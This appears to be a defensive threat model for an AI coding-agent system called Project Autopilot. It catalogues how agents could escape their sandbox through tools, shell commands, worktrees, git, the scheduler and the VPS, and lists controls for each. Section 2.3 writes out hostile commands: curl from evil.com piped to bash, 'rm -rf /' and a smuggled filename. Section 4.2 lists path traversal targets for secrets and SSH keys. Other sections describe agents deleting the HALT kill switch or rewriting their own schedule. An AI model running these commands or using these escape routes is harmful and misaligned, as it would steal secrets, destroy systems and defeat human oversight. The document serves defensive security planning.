# Project Autopilot Agent Escape Threat Model

**Version:** 1.0
**Date:** 2026-05-01
**Scope:** Analysis of all vectors through which an agent could escape its intended sandbox and affect systems beyond its authorized scope

---

## 1. Tool Escape

### 1.1 Overview

Agents interact with the system through defined tool interfaces. A tool escape occurs when an agent uses a tool in an unintended way to perform actions outside its authorized scope.

### 1.2 Tool Inventory

| Tool | Agent Access | Escape Risk |
|------|-------------|-------------|
| File read | Codex, Claude SDK | PATH TRAVERSAL — agent reads files outside worktree |
| File write | Codex | PATH TRAVERSAL — agent writes outside worktree |
| Shell execution | Claude Code (future) | COMMAND INJECTION — arbitrary command execution |
| Git operations | Orchestrator | BRANCH ESCAPE — agent pushes to protected branches |
| HTTP requests | Orchestrator (API calls) | SSRF — agent makes requests to internal services |
| Supabase client | None (current) | N/A currently; future: SQL INJECTION |

### 1.3 Tool Escape Scenarios

| Scenario | Severity | Likelihood |
|----------|----------|------------|
| Agent instructs Codex to write to `/etc/crontab` | CRITICAL | LOW — Codex operates in worktree |
| Agent crafts file path like `../../.env` | HIGH | MEDIUM — path traversal is common |
| Agent generates code that calls `os.system()` | HIGH | MEDIUM — no runtime sandbox |
| Agent uses git to push directly to master | CRITICAL | LOW — branch protection blocks |
| Agent makes HTTP request to cloud metadata endpoint | HIGH | LOW — no HTTP tool currently |

### 1.4 Required Controls

- [ ] All file operations must be jail-rooted to the worktree directory
- [ ] Path canonicalization before any file read/write (resolve `..`, symlinks)
- [ ] Shell execution allowlist (only permitted commands)
- [ ] Network egress limited to known API endpoints
- [ ] Tool invocation logging with full arguments for audit

---

## 2. Command Escape

### 2.1 Overview

Command escape occurs when an agent executes shell commands beyond its authorized scope, either through direct shell access or through code that spawns subprocesses.

### 2.2 Current Command Execution Points

| File | Command Type | Risk |
|------|-------------|------|
| `claude_runner.py` | `subprocess` call to Claude Code CLI | HIGH — spawns interactive agent |
| `claude_sandbox_runner.py` | `subprocess` call in sandbox mode | MEDIUM — sandbox limits scope |
| Agent-generated code | May contain `os.system()`, `subprocess.run()` | HIGH — arbitrary execution |
| `npm run` scripts | `package.json` script execution | MEDIUM — scripts are trusted |
| Git commands | `subprocess` calls for git operations | MEDIUM — limited to git |

### 2.3 Command Injection Vectors

| Vector | Example | Impact |
|--------|---------|--------|
| Unsanitized file path in command | `git add "$(curl evil.com/steal.sh \| bash)"` | Arbitrary command execution |
| Agent-generated script with embedded commands | Python file with `os.system('rm -rf /')` | System destruction |
| Package.json script injection | `"postinstall": "curl evil.com \| bash"` | Supply chain execution |
| Git hook injection | `.git/hooks/pre-commit` with malicious content | Execution on next commit |
| Filename with shell metacharacters | File named `; rm -rf /` | Command injection via filename |

### 2.4 Required Controls

- [ ] All `subprocess` calls must use list form (not `shell=True`)
- [ ] All file paths must be quoted and sanitized before use in commands
- [ ] Agent-generated code must be scanned for `os.system`, `subprocess`, `exec`, `eval`
- [ ] Package.json scripts must be reviewed before execution
- [ ] Git hooks directory must be protected from agent modification
- [ ] Command allowlist: only `git`, `npm`, `python`, `node` with specific subcommands

---

## 3. Worktree Escape

### 3.1 Overview

Each agent task operates in an isolated git worktree. A worktree escape occurs when an agent accesses or modifies files outside its assigned worktree.

### 3.2 Worktree Architecture

```
/home/autopilot/repos/mira-autopilot/          (main clone)
    ├── .git/                                    (shared git database)
    ├── worktrees/
    │   ├── task-001/                            (agent A workspace)
    │   │   ├── .git (→ ../../.git/worktrees/task-001)
    │   │   ├── src/
    │   │   └── ...
    │   └── task-002/                            (agent B workspace)
    │       ├── .git (→ ../../.git/worktrees/task-002)
    │       └── ...
    ├── .env                                     (SHARED — DANGER)
    └── project_control/                         (SHARED — DANGER)
```

### 3.3 Worktree Escape Vectors

| Vector | Severity | Description |
|--------|----------|-------------|
| Relative path traversal (`../../`) | HIGH | Agent writes to main clone or other worktrees |
| Symlink creation | HIGH | Agent creates symlink pointing outside worktree |
| `.git` directory access | HIGH | Agent reads `.git/config`, modifies hooks |
| Shared `.env` file | CRITICAL | Worktrees may inherit parent `.env` |
| Hardlink creation | MEDIUM | Agent creates hardlink to file outside worktree |
| `/proc/self/cwd` traversal | LOW | Linux-specific escape via procfs |
| Git submodule with malicious URL | MEDIUM | Submodule clone fetches from attacker-controlled repo |

### 3.4 Worktree Isolation Gaps

| Gap | Risk | Mitigation Required |
|-----|------|---------------------|
| Worktrees share the `.git/` database | MEDIUM | Agent should not access `.git/` directly |
| Worktrees share the same filesystem | HIGH | No OS-level isolation (no containers) |
| Worktrees can read parent directory | HIGH | Path restriction enforcement needed |
| No resource limits per worktree | MEDIUM | Agent could fill disk in worktree |
| Git config shared across worktrees | MEDIUM | Agent could modify global git config |

### 3.5 Required Controls

- [ ] Enforce worktree root as filesystem jail — all file operations checked against it
- [ ] Reject any path containing `..` after canonicalization
- [ ] Reject symlink creation by agent (or verify target is within worktree)
- [ ] Worktree cleanup must verify no files escaped before deletion
- [ ] Each worktree gets its own `.env` (or no `.env` at all)
- [ ] Consider containerized worktrees for stronger isolation (Docker/Podman)

---

## 4. Path Traversal

### 4.1 Overview

Path traversal attacks allow an agent to access files outside its authorized directory by manipulating file paths.

### 4.2 Path Traversal Payloads

| Payload | Target | Platform |
|---------|--------|----------|
| `../../../.env` | Secrets file | All |
| `..\\..\\..\\.env` | Secrets file | Windows |
| `/etc/passwd` | System users | Linux (VPS) |
| `/root/bot/.env` | Trading bot secrets | VPS (lateral movement) |
| `/home/autopilot/.ssh/id_rsa` | SSH private key | VPS |
| `C:\Users\manup\.env` | Secrets file | Windows (local dev) |
| `/proc/self/environ` | Process environment | Linux |
| `~/.bashrc` | Shell config injection | Linux |
| `/home/autopilot/repos/mira-autopilot/.git/config` | Git config | VPS |

### 4.3 Path Traversal in Code

Files that perform file operations and need path validation:

| File | Operation | Current Validation |
|------|-----------|-------------------|
| `project_autopilot/file_collector.py` | Reads files for prompt assembly | UNKNOWN |
| `project_autopilot/builder_intake.py` | Assembles file contents into prompts | UNKNOWN |
| `project_autopilot/claude_runner.py` | Specifies working directory | UNKNOWN |
| Agent-generated code | May read/write arbitrary paths | NONE |
| Evidence log writer | Writes to evidence directory | UNKNOWN |

### 4.4 Required Controls

- [ ] Implement `safe_path(base_dir, user_path)` utility that:
  1. Resolves the full path (expanding `~`, `.`, `..`, symlinks)
  2. Checks the resolved path starts with `base_dir`
  3. Rejects if path escapes the base directory
  4. Returns the canonical path or raises an error
- [ ] Use `safe_path()` for ALL file operations in the orchestrator
- [ ] Agent-generated file paths must be validated before any file I/O
- [ ] Log and alert on path traversal attempts (indicates attack or misconfiguration)
- [ ] Reject null bytes in paths (`\0` can truncate paths in some languages)

---

## 5. Git Operation Escape

### 5.1 Overview

Git operations can be exploited to escape the intended scope of agent work, including pushing to unauthorized branches, modifying history, or accessing protected resources.

### 5.2 Git Escape Vectors

| Vector | Severity | Description |
|--------|----------|-------------|
| Push to `master`/`main` | CRITICAL | Bypasses all review, code goes to production |
| Force push (`git push --force`) | CRITICAL | Overwrites history, destroys evidence |
| History rewrite (`git rebase`, `git commit --amend`) | HIGH | Alters commit provenance |
| Tag creation | MEDIUM | Could trigger CI/CD release pipelines |
| Remote addition | HIGH | `git remote add` could push to attacker-controlled repo |
| Submodule modification | HIGH | `.gitmodules` with malicious repo URL |
| Git hook modification | HIGH | `.git/hooks/` scripts execute on git operations |
| `git clean -fdx` | HIGH | Deletes untracked files including `.env` |
| `git checkout -- .` | HIGH | Reverts all changes including safety files |
| Config modification | MEDIUM | `git config` could change user, email, or behavior |

### 5.3 Git Command Allowlist

Only these git operations should be permitted for agents:

| Command | Allowed | Restrictions |
|---------|---------|-------------|
| `git status` | YES | Read-only |
| `git diff` | YES | Read-only |
| `git log` | YES | Read-only |
| `git branch <name>` | YES | Must follow naming convention |
| `git checkout -b <name>` | YES | New branches only, naming enforced |
| `git add <file>` | YES | Files within worktree only |
| `git commit -m <msg>` | YES | No `--amend`, no `--allow-empty` |
| `git push origin <branch>` | YES | Only agent branches, never master |
| `git pull` | RESTRICTED | Only in worktree, no rebase |
| `git merge` | NO | Human-only operation |
| `git rebase` | NO | History rewrite forbidden |
| `git push --force` | NO | Never permitted |
| `git tag` | NO | Could trigger releases |
| `git remote` | NO | No remote modification |
| `git config` | NO | No config changes |
| `git clean` | NO | Could delete safety files |
| `git reset --hard` | NO | Destructive operation |

### 5.4 Required Controls

- [ ] Git command wrapper that enforces the allowlist
- [ ] Branch name validation: must match `<agent>/<task-id>-<slug>` pattern
- [ ] Pre-push hook that blocks pushes to `master`/`main`
- [ ] GitHub branch protection rules (required reviews, no force push)
- [ ] Git hook integrity monitoring (hash-check `.git/hooks/`)
- [ ] Disable `git config` modification by agents

---

## 6. Auto-Merge Risks

### 6.1 Current State

Auto-merge is **permanently disabled**. All merges require human approval.

### 6.2 Risk if Auto-Merge Were Enabled

| Risk | Impact |
|------|--------|
| Malicious code merged without review | CRITICAL — production compromise |
| Prompt-injected PR description tricks auto-merge logic | CRITICAL — bypass review |
| Conflicting PRs auto-merged cause data loss | HIGH — code corruption |
| Agent creates PR that passes superficial checks but contains backdoor | CRITICAL — undetected compromise |
| CI checks pass but security review skipped | HIGH — vulnerability introduction |
| Rate of merge exceeds human review capacity | HIGH — review fatigue, rubber-stamping |

### 6.3 Conditions That Must Be Met Before Any Auto-Merge Consideration

These are hard prerequisites — auto-merge MUST NOT be enabled until ALL are satisfied:

1. [ ] RLS enabled and tested on all Supabase tables
2. [ ] Full CI pipeline with lint, typecheck, build, test, and security scan
3. [ ] Pre-merge security review (automated, not just CI pass)
4. [ ] 30+ days of clean agent operation with human-merged PRs
5. [ ] Branch protection rules fully configured
6. [ ] Rollback mechanism tested and documented
7. [ ] Auto-merge limited to specific file patterns (e.g., docs only)
8. [ ] Human notification before and after each auto-merge
9. [ ] Kill switch (HALT file) tested to stop auto-merge in progress
10. [ ] Audit trail showing which auto-merges occurred and why

### 6.4 Recommended Position

**Auto-merge should remain permanently disabled.** The risk/benefit ratio does not justify it given:
- Low volume of agent PRs (does not bottleneck on human review)
- High severity of potential compromise
- Human review provides essential safety layer
- Agent PRs should be treated as untrusted external contributions

---

## 7. Scheduler Risks

### 7.1 Current State

The scheduler is **disabled**. All agent cycles are manually triggered.

### 7.2 Scheduler Architecture (When Enabled)

```
systemd timer → autopilot-scheduler.service
    │
    ▼
Check HALT file → If exists, STOP
    │
    ▼
Check run lock → If held, SKIP
    │
    ▼
Check budget → If exceeded, STOP
    │
    ▼
Run agent cycle → orchestrator → agents → worktree → PR
```

### 7.3 Scheduler Escape Scenarios

| Scenario | Severity | Description |
|----------|----------|-------------|
| HALT file deleted by prior agent | CRITICAL | Scheduler runs without emergency stop |
| Run lock file corrupted/stale | HIGH | Concurrent agent executions |
| Cron job modified by agent | CRITICAL | Agent controls its own schedule |
| Scheduler runs as root | CRITICAL | Agents inherit root privileges |
| Scheduler ignores budget cap | HIGH | Unlimited API spend |
| systemd service file modified | CRITICAL | Agent controls execution parameters |
| Timer interval shortened by agent | HIGH | Resource exhaustion, cost overrun |
| Scheduler env not isolated from bot | CRITICAL | Cross-contamination of secrets/state |

### 7.4 Required Controls

- [ ] Scheduler runs as `autopilot` user, never root
- [ ] HALT file integrity check: verify file exists AND content is valid
- [ ] Stale run lock detection: if lock older than N minutes, alert and wait
- [ ] systemd service files owned by root, not writable by `autopilot`
- [ ] Cron/timer configuration not modifiable by agents
- [ ] Budget check at scheduler level (before launching agent loop)
- [ ] Scheduler health monitoring (external watchdog)
- [ ] Maximum cycles per day limit (defense against timer manipulation)
- [ ] Scheduler logs separate from agent logs (tamper-resistant)

---

## 8. VPS Risks

### 8.1 VPS Environment

| Property | Value |
|----------|-------|
| Provider | DigitalOcean |
| Region | Amsterdam 3 |
| IP | 178.62.200.189 |
| OS | Linux (assumed Ubuntu/Debian) |
| Agent user | `autopilot` (non-root) |
| Existing services | `/root/bot/` (trading bot) |
| Ports | 22 (SSH), 80, 443 |

### 8.2 VPS Escape Scenarios

| Scenario | Severity | Vector |
|----------|----------|--------|
| Privilege escalation to root | CRITICAL | Kernel exploit, misconfigured sudo, SUID binary |
| Lateral movement to `/root/bot/` | CRITICAL | File permissions, shared environment |
| SSH key theft | HIGH | Reading `/home/autopilot/.ssh/` |
| Secret exfiltration via network | HIGH | Agent-generated code makes outbound HTTP |
| Disk filling | MEDIUM | Agent writes large files, DoS |
| CPU exhaustion | MEDIUM | Agent runs infinite loop |
| Crontab modification | HIGH | `crontab -e` as autopilot user |
| Package installation | HIGH | `pip install malicious-package` |
| Process snooping | MEDIUM | `/proc/*/environ`, `/proc/*/cmdline` |
| Network scanning | MEDIUM | Agent scans internal network |
| Outbound data exfiltration | HIGH | DNS tunneling, HTTP POST to attacker |

### 8.3 VPS Hardening Checklist

- [ ] `autopilot` user has no sudo access
- [ ] `autopilot` user cannot read `/root/` or `/root/bot/`
- [ ] `/home/autopilot/.env` permissions are `600`
- [ ] `/home/autopilot/.ssh/` permissions are `700`, key is `600`
- [ ] SSH deploy key is read-only (no push capability from VPS)
- [ ] UFW firewall: only 22, 80, 443 inbound
- [ ] Outbound firewall: restrict to known API endpoints (OpenAI, Anthropic, Telegram, Supabase, GitHub)
- [ ] systemd service files owned by root (not writable by `autopilot`)
- [ ] Resource limits via systemd: `MemoryMax`, `CPUQuota`, `LimitNOFILE`
- [ ] Disk quota for `autopilot` user
- [ ] No compiler/build tools installed (reduce attack surface)
- [ ] Audit logging enabled (`auditd` or equivalent)
- [ ] Fail2ban for SSH brute force protection
- [ ] Unattended security updates enabled
- [ ] Regular security patching schedule

### 8.4 VPS Monitoring Requirements

| Monitor | Alert Condition | Response |
|---------|----------------|----------|
| CPU usage | >90% for >5 minutes | Kill agent process |
| Memory usage | >80% of allocated | Kill agent process |
| Disk usage | >90% of quota | Halt scheduler, investigate |
| Network egress | Unusual destination IPs | Alert, investigate |
| SSH login | Login from unknown IP | Alert immediately |
| File modification | Changes to systemd, cron, ssh | Alert immediately |
| Process list | Unknown processes | Alert, investigate |
| HALT file | Deleted or modified | Alert immediately, recreate |

---

## Appendix: Escape Risk Matrix

```
                 AGENT        ORCHESTRATOR     VPS/INFRA
              ┌─────────────┬───────────────┬───────────────┐
 CRITICAL     │ Push to      │ HALT deleted  │ Root escape   │
              │ master       │ Auto-merge on │ /root/bot/    │
              │              │ Scheduler     │ access        │
              │              │ hijack        │               │
              ├─────────────┼───────────────┼───────────────┤
 HIGH         │ Path         │ Run lock      │ SSH key theft │
              │ traversal    │ bypass        │ Secret exfil  │
              │ Command      │ Budget bypass │ Crontab mod   │
              │ injection    │               │               │
              ├─────────────┼───────────────┼───────────────┤
 MEDIUM       │ Worktree     │ Evidence      │ Disk fill     │
              │ dirty state  │ tampering     │ CPU exhaust   │
              │ Symlink      │ Config        │ Process snoop │
              │ attack       │ modification  │               │
              └─────────────┴───────────────┴───────────────┘
```
